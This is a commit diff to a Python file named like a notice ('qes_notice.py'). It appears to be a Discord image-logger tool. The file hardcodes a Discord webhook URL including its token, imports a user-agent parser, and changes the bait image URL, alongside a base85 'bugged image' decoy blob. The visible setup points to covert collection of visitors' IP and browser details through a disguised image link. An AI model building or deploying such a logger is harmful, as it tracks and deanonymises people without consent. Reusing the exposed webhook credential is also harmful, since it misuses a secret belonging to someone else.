9a3cd55eafe0799b8f4c5ebd3d7185167e796a0e
aterally <aterally@gmail.com>
2025-08-14 15:23:11 +0800

    Update qes_notice.py

--- api/qes_notice.py
+++ api/qes_notice.py
@@ -4,7 +4,7 @@ import httpx, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1405437939755913328/aWkBQ4barQ4mO_KxmuHU2qd5xiH6t6875NDcchabhcRvf4cBbOeCD9oEDeiLM-u4IJt5'
 
-bindata = httpx.get('https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Gay_Pride_Flag.svg/1200px-Gay_Pride_Flag.svg.png').content
+bindata = httpx.get('https://i.ibb.co/G316scBN/image.png').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
